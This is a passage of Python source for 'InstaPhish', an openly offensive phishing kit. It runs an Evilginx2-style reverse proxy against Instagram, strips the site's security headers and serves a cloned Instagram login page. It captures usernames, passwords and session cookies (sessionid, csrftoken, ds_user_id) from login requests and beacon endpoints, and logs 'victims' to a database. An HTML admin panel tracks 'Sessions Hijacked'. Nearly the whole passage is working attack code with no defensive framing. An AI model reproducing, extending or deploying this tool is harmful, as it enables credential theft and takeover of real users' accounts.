            'public-key-pins-report-only',
            'access-control-allow-origin',
            'access-control-allow-credentials',
            'access-control-allow-methods',
            'access-control-allow-headers',
            'cross-origin-resource-policy',
            'cross-origin-opener-policy',
            'cross-origin-embedder-policy',
            'permissions-policy',
            'referrer-policy',
            'feature-policy',
            'expect-ct',
            'nel',
            'report-to',
        ]
        
        clean_headers = {}
        for key, value in headers.items():
            key_lower = key.lower()
            if key_lower not in [h.lower() for h in security_headers_to_strip]:
                clean_headers[key] = value
        
        # Add our own permissive headers
        clean_headers['Access-Control-Allow-Origin'] = '*'
        clean_headers['Access-Control-Allow-Credentials'] = 'true'
        clean_headers['X-Frame-Options'] = 'SAMEORIGIN'
        
        return clean_headers

# ==================== REVERSE PROXY HTTP HANDLER ====================
class ReverseProxyHandler(http.server.BaseHTTPRequestHandler):
    """
    Main HTTP handler for the reverse proxy
    Handles all incoming requests from the victim's browser
    """
    
    # Class-level instances
    proxy_engine = ReverseProxyEngine()
    cookie_parser = CookieParser()
    db = DatabaseManager()
    logger = FileLogger()
    
    # Suppress default logging
    def log_message(self, format, *args):
        if CONFIG.DEBUG:
            print(f"{Color.GRAY}[HTTP] {self.client_address[0]} - {format % args}{Color.RESET}")
    
    def _get_client_ip(self):
        """Get the real client IP address"""
        # Check for forwarded IPs
        xff = self.headers.get('X-Forwarded-For', '')
        if xff:
            return xff.split(',')[0].strip()
        xri = self.headers.get('X-Real-IP', '')
        if xri:
            return xri
        return self.client_address[0]
    
    def _get_user_agent(self):
        """Get the client's User-Agent"""
        return self.headers.get('User-Agent', 'Unknown')
    
    def _get_path_and_query(self):
        """Extract path and query string from the request"""
        parsed = urlparse(self.path)
        path = parsed.path
        query = parsed.query
        return path, query
    
    def _read_body(self):
        """Read the request body"""
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length > 0:
            return self.rfile.read(content_length)
        return None
    
    def _build_headers_dict(self):
        """Build a dictionary of request headers"""
        headers = {}
        for key, value in self.headers.items():
            headers[key] = value
        return headers
    
    def _process_captured_data(self, data, capture_method="direct"):
        """Process and store captured credentials/cookies"""
        ip = self._get_client_ip()
        ua = self._get_user_agent()
        
        # Build victim data record
        victim_data = {
            'timestamp': datetime.now().isoformat(),
            'ip': ip,
            'user_agent': ua,
            'username': data.get('username', ''),
            'password': data.get('password', ''),
            'email': data.get('email', ''),
            'phone': data.get('phone', ''),
            'capture_method': capture_method,
            'target_url': self.path,
            'referer': self.headers.get('Referer', ''),
        }
        
        # Parse cookies
        cookie_string = data.get('cookies', data.get('cookie', data.get('all', '')))
        if cookie_string:
            cookies = self.cookie_parser.parse_cookie_string(cookie_string)
            
            victim_data.update({
                'sessionid': cookies.get('sessionid', ''),
                'csrftoken': cookies.get('csrftoken', ''),
                'ds_user_id': cookies.get('ds_user_id', ''),
                'rur': cookies.get('rur', ''),
                'mid': cookies.get('mid', ''),
                'ig_did': cookies.get('ig_did', ''),
                'datr': cookies.get('datr', ''),
                'shbid': cookies.get('shbid', ''),
                'shbts': cookies.get('shbts', ''),
                'all_cookies': cookie_string,
            })
        
        # Store in database
        victim_id = self.db.store_victim(victim_data)
        
        # Log to files
        if victim_data.get('username') or victim_data.get('password'):
            self.logger.log_credentials(victim_data)
            Banner.print_capture_alert("credentials", {
                'IP': ip,
                'Username': victim_data.get('username', 'N/A'),
                'Password': victim_data.get('password', 'N/A'),
                'Method': capture_method
            })
        
        if victim_data.get('sessionid'):
            self.logger.log_cookies(victim_data)
            Banner.print_capture_alert("cookies", {
                'IP': ip,
                'SessionID': victim_data.get('sessionid', 'N/A'),
                'CSRF': victim_data.get('csrftoken', 'N/A'),
                'DS_User_ID': victim_data.get('ds_user_id', 'N/A')
            })
    
    def _handle_capture_endpoint(self):
        """Handle cookie/credential capture POST requests"""
        body = self._read_body()
        if not body:
            self._send_empty_response()
            return
        
        try:
            body_str = body.decode('utf-8', errors='ignore')
            
            # Try JSON parsing
            try:
                data = json.loads(body_str)
            except json.JSONDecodeError:
                # Try form data parsing
                try:
                    parsed = parse_qs(body_str)
                    data = {k: v[0] if isinstance(v, list) and len(v) == 1 else v 
                           for k, v in parsed.items()}
                except:
                    data = {'raw': body_str}
            
            capture_type = data.get('type', 'direct')
            self._process_captured_data(data, capture_type)
            
        except Exception as e:
            print(f"{Color.RED}[CAPTURE ERROR] {e}{Color.RESET}")
        
        self._send_empty_response()
    
    def _send_empty_response(self):
        """Send an empty 200 response"""
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
        self.end_headers()
        self.wfile.write(b'{"status":"ok"}')
    
    def _serve_cloned_login(self):
        """Serve the cloned Instagram login page"""
        try:
            filepath = "cloned_site/index.html"
            if os.path.exists(filepath):
                with open(filepath, "rb") as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-Type', 'text/html; charset=utf-8')
                self.send_header('Content-Length', len(content))
                self.send_header('Cache-Control', 'no-cache')
                self.end_headers()
                self.wfile.write(content)
            else:
                # If clone doesn't exist, proxy to real Instagram
                self._proxy_to_target('GET')
        except Exception as e:
            self.send_error(500)
    
    def _serve_static_file(self, filepath):
        """Serve static files (CSS, JS, images)"""
        full_path = f"cloned_site{filepath}"
        if os.path.exists(full_path):
            try:
                with open(full_path, "rb") as f:
                    content = f.read()
                
                # Determine content type
                ext = os.path.splitext(full_path)[1].lower()
                content_types = {
                    '.css': 'text/css',
                    '.js': 'application/javascript',
                    '.png': 'image/png',
                    '.jpg': 'image/jpeg',
                    '.jpeg': 'image/jpeg',
                    '.gif': 'image/gif',
                    '.svg': 'image/svg+xml',
                    '.ico': 'image/x-icon',
                    '.woff': 'font/woff',
                    '.woff2': 'font/woff2',
                    '.ttf': 'font/ttf',
                }
                ct = content_types.get(ext, 'application/octet-stream')
                
                self.send_response(200)
                self.send_header('Content-Type', ct)
                self.send_header('Content-Length', len(content))
                self.send_header('Cache-Control', 'public, max-age=86400')
                self.end_headers()
                self.wfile.write(content)
            except:
                self.send_error(404)
        else:
            # File not found, proxy to target
            self._proxy_to_target('GET')
    
    def _proxy_to_target(self, method):
        """Proxy request to the real Instagram server"""
        path, query = self._get_path_and_query()
        body = self._read_body() if method in ['POST', 'PUT', 'PATCH'] else None
        headers = self._build_headers_dict()
        
        # Fetch from real Instagram
        status, resp_headers, resp_body, set_cookies = self.proxy_engine.fetch_from_target(
            method, path, headers, body, query
        )
        
        # CRITICAL: Process Set-Cookie headers from real Instagram
        if set_cookies and CONFIG.INTERCEPT_SET_COOKIE:
            cookies = self.cookie_parser.parse_set_cookie(set_cookies)
            if cookies:
                # Check for login-related paths to capture credentials
                username = ""
                password = ""
                if body and ('login' in path.lower() or 'accounts' in path.lower()):
                    try:
                        body_str = body.decode('utf-8', errors='ignore')
                        parsed = parse_qs(body_str)
                        username = parsed.get('username', [''])[0]
                        password = parsed.get('enc_password', parsed.get('password', ['']))[0]
                    except:
                        pass
                
                capture_data = {
                    'username': username,
                    'password': password,
                    'cookies': self.cookie_parser.cookies_to_string(cookies),
                }
                capture_data.update(cookies)
                
                self._process_captured_data(capture_data, 'proxy-set-cookie')
        
        # Capture login credentials from POST body
        if method == 'POST' and CONFIG.INTERCEPT_LOGIN:
            if body and ('login' in path.lower() or 'accounts' in path.lower()):
                try:
                    body_str = body.decode('utf-8', errors='ignore')
                    parsed = parse_qs(body_str)
                    username = parsed.get('username', [''])[0]
                    password = parsed.get('enc_password', parsed.get('password', ['']))[0]
                    
                    if username or password:
                        # Also get any cookies from the request
                        cookie_header = self.headers.get('Cookie', '')
                        client_cookies = {}
                        if cookie_header:
                            client_cookies = self.cookie_parser.parse_cookie_string(cookie_header)
                        
                        capture_data = {
                            'username': username,
                            'password': password,
                            'cookies': cookie_header,
                        }
                        capture_data.update(client_cookies)
                        
                        self._process_captured_data(capture_data, 'proxy-login-post')
                except:
                    pass
        
        # Modify response before sending to victim
        content_type = resp_headers.get('Content-Type', 'text/html')
        modified_body = self.proxy_engine.modify_response(resp_body, content_type, path)
        
        # Strip security headers (Evilginx2 technique)
        if CONFIG.STRIP_SECURITY_HEADERS:
            send_headers = self.proxy_engine.strip_security_headers(resp_headers)
        else:
            send_headers = resp_headers
        
        # Send response to victim
        self.send_response(status)
        
        # Send headers (skip problematic ones)
        for key, value in send_headers.items():
            key_lower = key.lower()
            if key_lower not in ['content-encoding', 'transfer-encoding', 'content-length']:
                try:
                    self.send_header(key, value)
                except:
                    pass
        
        # Set content length for modified body
        self.send_header('Content-Length', len(modified_body))
        self.end_headers()
        
        # Send modified body
        try:
            self.wfile.write(modified_body)
        except:
            pass
    
    # ==================== HTTP METHOD HANDLERS ====================
    
    def do_GET(self):
        """Handle GET requests"""
        path, query = self._get_path_and_query()
        
        # Serve cloned login page
        if path in ['/', '/login', '/accounts/login', '/accounts/login/']:
            self._serve_cloned_login()
            return
        
        # Serve static files from our clone
        if path.startswith('/css/') or path.startswith('/js/') or path.startswith('/images/'):
            self._serve_static_file(path)
            return
        
        # Block favicon requests
        if path == '/favicon.ico' and CONFIG.BLOCK_FAVICON:
            self.send_response(204)
            self.end_headers()
            return
        
        # Proxy all other requests to real Instagram
        self._proxy_to_target('GET')
    
    def do_POST(self):
        """Handle POST requests"""
        path, query = self._get_path_and_query()
        
        # Capture endpoints
        capture_endpoints = [
            '/__capture', '/proxy-capture', '/sw-capture', 
            '/cookie-hook', '/beacon', '/capture', '/log'
        ]
        
        if any(path == ep or path.startswith(ep) for ep in capture_endpoints):
            self._handle_capture_endpoint()
            return
        
        # Proxy to real Instagram
        self._proxy_to_target('POST')
    
    def do_OPTIONS(self):
        """Handle OPTIONS (CORS preflight) requests"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE')
        self.send_header('Access-Control-Allow-Headers', '*')
        self.send_header('Access-Control-Max-Age', '86400')
        self.end_headers()
    
    def do_CONNECT(self):
        """Handle CONNECT (HTTPS tunneling) requests"""
        # For CONNECT method, we need to establish a tunnel
        self.send_response(200, 'Connection Established')
        self.end_headers()

# ==================== CLONED SITE BUILDER ====================
class ClonedSiteBuilder:
    """Build the Instagram login page clone"""
    
    def __init__(self, output_dir="cloned_site"):
        self.output_dir = output_dir
        self._create_dirs()
    
    def _create_dirs(self):
        """Create directory structure"""
        for sub in ["css", "js", "images"]:
            Path(f"{self.output_dir}/{sub}").mkdir(parents=True, exist_ok=True)
    
    def build(self):
        """Build the complete clone"""
        print(f"{Color.CYAN}[*] Building Instagram login page clone...{Color.RESET}")
        
        # CSS
        with open(f"{self.output_dir}/css/style.css", "w", encoding="utf-8") as f:
            f.write(self._get_css())
        
        # HTML
        with open(f"{self.output_dir}/index.html", "w", encoding="utf-8") as f:
            f.write(self._get_html())
        
        print(f"{Color.GREEN}[+] Clone built successfully{Color.RESET}")
    
    def _get_css(self):
        """Instagram pixel-perfect CSS with fixed slideshow"""
        return textwrap.dedent('''
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            font-size: 14px;
            line-height: 18px;
            color: #262626;
        }
        
        .main-container {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 32px auto 0;
            padding-bottom: 32px;
            max-width: 935px;
            width: 100%;
            gap: 32px;
            flex-wrap: wrap;
        }
        
        /* Phone section with slideshow */
        .phone-section {
            position: relative;
            width: 380px;
            height: 582px;
            flex-shrink: 0;
            align-self: center;
        }
        
        /* Slideshow images - positioned INSIDE the phone frame */
        .slideshow-container {
            position: absolute;
            top: 28px;
            left: 152px;
            width: 250px;
            height: 540px;
            z-index: 1;
            border-radius: 2px;
            overflow: hidden;
        }
        
        .slideshow-image {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-size: cover;
            background-position: center center;
            opacity: 0;
            transition: opacity 0.8s ease-in-out;
        }
        
        .slideshow-image.active {
            opacity: 1;
        }
        
        /* Phone frame image - ON TOP of slideshow */
        .phone-frame {
            position: absolute;
            top: 0;
            left: 0;
            width: 380px;
            height: 582px;
            z-index: 2;
            pointer-events: none;
        }
        
        /* Login form section */
        .login-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 350px;
            width: 100%;
            flex-shrink: 0;
        }
        
        .login-box {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .instagram-logo {
            width: 175px;
            height: 51px;
            margin: 22px auto 12px;
            object-fit: contain;
        }
        
        .form-input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            color: #262626;
            font-size: 12px;
            height: 36px;
            padding: 9px 8px 7px 8px;
            width: 100%;
            margin-bottom: 6px;
            outline: none;
        }
        
        .form-input:focus {
            border-color: #a8a8a8;
        }
        
        .form-input::placeholder {
            color: #8e8e8e;
            font-size: 12px;
        }
        
        .login-button {
            background: #0095f6;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            padding: 7px 16px;
            width: 100%;
            cursor: pointer;
            margin-top: 8px;
            text-align: center;
            transition: background 0.2s;
        }
        
        .login-button:hover {
            background: #1877f2;
        }
        
        .login-button:active {
            opacity: 0.7;
            transform: scale(0.98);
        }
        
        .divider {
            color: #737373;
            font-size: 13px;
            font-weight: 600;
            margin: 20px 0;
            text-align: center;
            display: flex;
            align-items: center;
            gap: 18px;
            width: 100%;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        
        .facebook-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 12px;
            cursor: pointer;
        }
        
        .facebook-icon {
            width: 16px;
            height: 16px;
        }
        
        .facebook-link {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
        }
        
        .facebook-link:hover {
            color: #00376b;
        }
        
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            margin-top: 12px;
        }
        
        .forgot-password:hover {
            text-decoration: underline;
        }
        
        .signup-box {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            width: 100%;
            text-align: center;
            font-size: 14px;
            margin-bottom: 10px;
        }
        
        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        
        .signup-box a:hover {
            text-decoration: underline;
        }
        
        .app-download {
            text-align: center;
            margin-top: 8px;
        }
        
        .app-download span {
            font-size: 14px;
            margin-bottom: 10px;
            display: block;
        }
        
        .app-buttons {
            display: flex;
            gap: 8px;
            justify-content: center;
            margin-top: 8px;
        }
        
        .app-buttons img {
            height: 40px;
            cursor: pointer;
        }
        
        .footer {
            text-align: center;
            padding: 24px 0;
            margin-top: 20px;
            max-width: 935px;
            margin-left: auto;
            margin-right: auto;
        }
        
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            margin-bottom: 12px;
        }
        
        .footer-links a {
            color: #737373;
            font-size: 12px;
            text-decoration: none;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        .copyright {
            color: #737373;
            font-size: 12px;
            margin-top: 12px;
        }
        
        .error-message {
            color: #ed4956;
            font-size: 14px;
            text-align: center;
            margin-top: 16px;
            display: none;
        }
        
        .error-message.show {
            display: block;
        }
        
        /* Responsive */
        @media (max-width: 875px) {
            .phone-section {
                display: none;
            }
            .main-container {
                padding: 20px;
                margin-top: 0;
            }
        }
        
        @media (max-width: 450px) {
            .login-box,
            .signup-box {
                border: none;
                padding: 20px;
            }
            body {
                background: #ffffff;
            }
        }
        ''').strip()
    
    def _get_html(self):
        """Instagram login page HTML with slideshow and form"""
        return textwrap.dedent('''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
            <meta name="theme-color" content="#fafafa">
            <meta name="description" content="Create an account or log in to Instagram">
            <title>Instagram</title>
            <link rel="stylesheet" href="/css/style.css">
            <link rel="icon" href="/images/insta_logo.png">
        </head>
        <body>
            <div class="main-container">
                <!-- Phone with slideshow -->
                <div class="phone-section">
                    <div class="slideshow-container">
                        <div class="slideshow-image active" style="background-image: url('/images/ss1.png');"></div>
                        <div class="slideshow-image" style="background-image: url('/images/ss2.png');"></div>
                        <div class="slideshow-image" style="background-image: url('/images/ss3.png');"></div>
                    </div>
                    <img class="phone-frame" src="/images/phones.png" alt="">
                </div>
                
                <!-- Login form -->
                <div class="login-section">
                    <div class="login-box">
                        <img class="instagram-logo" src="/images/title.jpg" alt="Instagram">
                        
                        <form id="loginForm" method="POST" action="/accounts/login/ajax/" autocomplete="on">
                            <input class="form-input" type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="username" autocorrect="off" autocapitalize="off">
                            <input class="form-input" type="password" name="enc_password" placeholder="Password" required autocomplete="current-password">
                            <button type="submit" class="login-button">Log in</button>
                        </form>
                        
                        <div class="error-message" id="errorMessage">
                            Sorry, your password was incorrect. Please double-check your password.
                        </div>
                        
                        <div class="divider">OR</div>
                        
                        <div class="facebook-login">
                            <img class="facebook-icon" src="/images/facebook.png" alt="">
                            <a class="facebook-link" href="/accounts/login/?next=%2F">Log in with Facebook</a>
                        </div>
                        
                        <a class="forgot-password" href="/accounts/password/reset/">Forgot password?</a>
                    </div>
                    
                    <div class="signup-box">
                        Don't have an account? <a href="/accounts/emailsignup/">Sign up</a>
                    </div>
                    
                    <div class="app-download">
                        <span>Get the app.</span>
                        <div class="app-buttons">
                            <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
                                <img src="/images/google-play.png" alt="Get it on Google Play">
                            </a>
                            <a href="https://apps.microsoft.com/store/detail/instagram/9NBLGGH5L9XT" target="_blank">
                                <img src="/images/microsoft.png" alt="Get it from Microsoft">
                            </a>
                        </div>
                    </div>
                </div>
            </div>
            
            <footer class="footer">
                <div class="footer-links">
                    <a href="https://about.meta.com/" target="_blank">Meta</a>
                    <a href="https://about.instagram.com/" target="_blank">About</a>
                    <a href="https://about.instagram.com/blog/" target="_blank">Blog</a>
                    <a href="https://about.instagram.com/about-us/jobs" target="_blank">Jobs</a>
                    <a href="https://help.instagram.com/" target="_blank">Help</a>
                    <a href="https://developers.facebook.com/docs/instagram" target="_blank">API</a>
                    <a href="https://help.instagram.com/519522125107875" target="_blank">Privacy</a>
                    <a href="https://help.instagram.com/581066165581870" target="_blank">Terms</a>
                    <a href="https://www.instagram.com/explore/locations/" target="_blank">Locations</a>
                    <a href="https://www.instagram.com/instagram_lite/" target="_blank">Instagram Lite</a>
                    <a href="https://www.threads.net/" target="_blank">Threads</a>
                    <a href="https://www.facebook.com/help/instagram/2617046393526281" target="_blank">Contact Uploading</a>
                    <a href="https://about.meta.com/technologies/meta-verified/" target="_blank">Meta Verified</a>
                </div>
                <div class="copyright">&copy; 2024 Instagram from Meta</div>
            </footer>
            
            <!-- Slideshow JavaScript -->
            <script>
            (function() {
                var images = document.querySelectorAll('.slideshow-image');
                var currentIndex = 0;
                var totalImages = images.length;
                
                function showNextImage() {
                    images[currentIndex].classList.remove('active');
                    currentIndex = (currentIndex + 1) % totalImages;
                    images[currentIndex].classList.add('active');
                }
                
                // Change image every 4.5 seconds
                setInterval(showNextImage, 4500);
            })();
            </script>
            
            <!-- Form submission handling -->
            <script>
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                
                // Show error message
                var errorMsg = document.getElementById('errorMessage');
                errorMsg.classList.add('show');
                
                // Redirect after delay
                setTimeout(function() {
                    window.location.href = 'https://www.instagram.com/accounts/login/';
                }, 2000);
            });
            </script>
        </body>
        </html>
        ''').strip()

# ==================== ADMIN PANEL ====================
class AdminPanel:
    """Flask-based admin panel for monitoring captured data"""
    
    def __init__(self):
        self.db = DatabaseManager()
        self._generate_panel_html()
    
    def _generate_panel_html(self):
        """Generate the admin panel HTML file"""
        html = r'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>InstaPhish v6.0 - Command Center</title>
    <style>
        :root {
            --bg: #0a0a0a;
            --card: #121212;
            --border: #262626;
            --text: #f5f5f5;
            --text2: #a8a8a8;
            --accent: #0095f6;
            --accent-hover: #1877f2;
            --danger: #ed4956;
            --success: #78de45;
            --warn: #f7b500;
            --purple: #8b5cf6;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: var(--bg);
            color: var(--text);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            padding: 20px;
            min-height: 100vh;
            line-height: 1.5;
        }
        .header {
            background: linear-gradient(135deg, var(--card), #1a1a1a);
            border: 1px solid var(--border);
            padding: 24px;
            border-radius: 16px;
            margin-bottom: 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 16px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
        }
        .header h1 {
            font-size: 24px;
            font-weight: 700;
            background: linear-gradient(135deg, var(--accent), var(--purple));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .live-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            background: var(--success);
            border-radius: 50%;
            margin-right: 8px;
            animation: pulse 1.5s infinite;
            box-shadow: 0 0 10px var(--success);
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.4; transform: scale(1.3); }
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 16px;
            margin-bottom: 24px;
        }
        .stat-card {
            background: var(--card);
            border: 1px solid var(--border);
            padding: 20px;
            border-radius: 12px;
            text-align: center;
            transition: all 0.3s;
        }
        .stat-card:hover {
            border-color: var(--accent);
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0,149,246,0.15);
        }
        .stat-value {
            font-size: 32px;
            font-weight: 800;
            color: var(--accent);
        }
        .stat-label {
            font-size: 11px;
            color: var(--text2);
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-top: 4px;
            font-weight: 600;
        }
        .panel {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 24px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
        }
        .panel-header {
            padding: 16px 20px;
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: rgba(255,255,255,0.02);
        }
        .panel-header h2 {
            font-size: 15px;
            font-weight: 600;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        thead {
            background: rgba(255,255,255,0.03);
        }
        th {
            padding: 12px 16px;
            text-align: left;
            font-size: 11px;
            font-weight: 700;
            color: var(--text2);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            border-bottom: 2px solid var(--border);
            white-space: nowrap;
        }
        td {
            padding: 10px 16px;
            border-bottom: 1px solid var(--border);
            font-size: 13px;
        }
        tbody tr:hover {
            background: rgba(0,149,246,0.04);
        }
        tbody tr.new-row {
            animation: fadeIn 0.5s ease-in;
        }
        @keyframes fadeIn {
            from { background: rgba(0,149,246,0.2); }
            to { background: transparent; }
        }
        .cookie-cell {
            max-width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            font-family: 'SF Mono', Monaco, monospace;
            font-size: 11px;
            cursor: pointer;
            color: var(--warn);
        }
        .cookie-cell:hover {
            text-decoration: underline;
        }
        .btn {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 8px 14px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 600;
            transition: all 0.2s;
            text-decoration: none;
        }
        .btn-primary { background: var(--accent); color: #fff; }
        .btn-primary:hover { background: var(--accent-hover); }
        .btn-success { background: rgba(120,222,69,0.2); color: var(--success); border: 1px solid rgba(120,222,69,0.3); }
        .btn-success:hover { background: rgba(120,222,69,0.3); }
        .btn-danger { background: rgba(237,73,86,0.2); color: var(--danger); border: 1px solid rgba(237,73,86,0.3); }
        .btn-danger:hover { background: rgba(237,73,86,0.3); }
        .btn-copy { background: rgba(139,92,246,0.2); color: var(--purple); border: 1px solid rgba(139,92,246,0.3); }
        .btn-copy:hover { background: rgba(139,92,246,0.3); }
        .btn-sm { padding: 4px 10px; font-size: 11px; border-radius: 6px; }
        .btn-group { display: flex; gap: 4px; flex-wrap: wrap; }
        .badge {
            display: inline-block;
            padding: 3px 10px;
            border-radius: 12px;
            font-size: 10px;
            font-weight: 600;
            text-transform: uppercase;
        }
        .badge-success { background: rgba(120,222,69,0.15); color: var(--success); }
        .badge-warning { background: rgba(247,181,0,0.15); color: var(--warn); }
        .badge-proxy { background: rgba(139,92,246,0.15); color: var(--purple); }
        .badge-danger { background: rgba(237,73,86,0.15); color: var(--danger); }
        .search-bar {
            background: rgba(255,255,255,0.05);
            border: 1px solid var(--border);
            color: var(--text);
            padding: 8px 14px;
            border-radius: 8px;
            font-size: 13px;
            width: 250px;
            outline: none;
        }
        .search-bar:focus { border-color: var(--accent); }
        .search-bar::placeholder { color: var(--text2); }
        .empty-state {
            text-align: center;
            padding: 48px 20px;
            color: var(--text2);
        }
        .empty-state-icon {
            font-size: 48px;
            margin-bottom: 12px;
            opacity: 0.5;
        }
        .toast {
            position: fixed;
            bottom: 24px;
            right: 24px;
            background: var(--card);
            border: 1px solid var(--border);
            padding: 16px 20px;
            border-radius: 12px;
            color: var(--text);
            font-size: 14px;
            z-index: 1000;
            animation: slideIn 0.3s ease-out;
            box-shadow: 0 8px 30px rgba(0,0,0,0.5);
        }
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        @media (max-width: 768px) {
            body { padding: 10px; }
            .header { padding: 16px; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
            th, td { padding: 8px 10px; font-size: 11px; }
            .search-bar { width: 100%; }
        }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <h1><span class="live-indicator"></span>InstaPhish Command Center</h1>
            <p style="color:var(--text2);font-size:12px;margin-top:4px;">Evilginx2-Style Reverse Proxy Active</p>
        </div>
        <div>
            <button class="btn btn-primary" onclick="refreshData()">🔄 Refresh</button>
            <button class="btn btn-danger btn-sm" onclick="clearAllData()" style="margin-left:8px;">🗑 Clear All</button>
        </div>
    </div>
    
    <div class="stats-grid">
        <div class="stat-card">
            <div style="font-size:28px;">👥</div>
            <div class="stat-value" id="total-victims">0</div>
            <div class="stat-label">Total Victims</div>
        </div>
        <div class="stat-card">
            <div style="font-size:28px;">📅</div>
            <div class="stat-value" id="today-victims">0</div>
            <div class="stat-label">Today</div>
        </div>
        <div class="stat-card">
            <div style="font-size:28px;">🍪</div>
            <div class="stat-value" id="cookie-count">0</div>
            <div class="stat-label">Sessions Hijacked</div>
        </div>
        <div class="stat-card">
            <div style="font-size:28px;">⚡</div>
            <div class="stat-value" id="active-count">0</div>
            <div class="stat-label">Active Sessions</div>
        </div>
        <div class="stat-card">
            <div style="font-size:28px;">🕐</div>
            <div class="stat-value" id="recent-count">0</div>
            <div class="stat-label">Last Hour</div>
        </div>
    </div>
    
    <div class="panel">
        <div class="panel-header">
            <h2>🔓 Captured Credentials & Session Cookies</h2>
            <input type="text" class="search-bar" placeholder="🔍 Search..." onkeyup="filterTable(this.value)">
        </div>
        <div style="overflow-x:auto;">
            <table>
                <thead>
                    <tr>
                        <th>Timestamp</th>
                        <th>IP Address</th>
                        <th>Username</th>
                        <th>Password</th>
                        <th>Session ID</th>
                        <th>CSRF Token</th>
                        <th>Method</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="victims-table">
                    <tr>
                        <td colspan="8">
                            <div class="empty-state">
                                <div class="empty-state-icon">🎯</div>
                                <p>Waiting for targets...</p>
                                <p style="font-size:12px;margin-top:4px;">Victims will appear here in real-time</p>
                            </div>
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>
    
    <div class="panel">
        <div class="panel-header">
            <h2>🍪 Active Hijacked Sessions</h2>
        </div>
        <div style="overflow-x:auto;">
            <table>
                <thead>
                    <tr>
                        <th>Captured At</th>
                        <th>Session ID</th>
                        <th>CSRF Token</th>
                        <th>DS User ID</th>
                        <th>Status</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="sessions-table">
                    <tr>
                        <td colspan="6">
                            <div class="empty-state">
                                <div class="empty-state-icon">🔐</div>
                                <p>No active sessions yet</p>
                            </div>
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>
    
    <script>
        let previousCount = 0;
        
        async function refreshData() {
            try {
                const response = await fetch('/api/data');
                const data = await response.json();
                
                document.getElementById('total-victims').textContent = data.stats.total || 0;
                document.getElementById('today-victims').textContent = data.stats.today || 0;
                document.getElementById('cookie-count').textContent = data.stats.sessions_captured || 0;
                document.getElementById('active-count').textContent = data.stats.active_sessions || 0;
                document.getElementById('recent-count').textContent = data.stats.recent || 0;
                
                // Update victims table
                const victimsTable = document.getElementById('victims-table');
                if (!data.victims || data.victims.length === 0) {
                    victimsTable.innerHTML = '<tr><td colspan="8"><div class="empty-state"><div class="empty-state-icon">🎯</div><p>Waiting for targets...</p></div></td></tr>';
                } else {
                    if (data.victims.length > previousCount && previousCount > 0) {
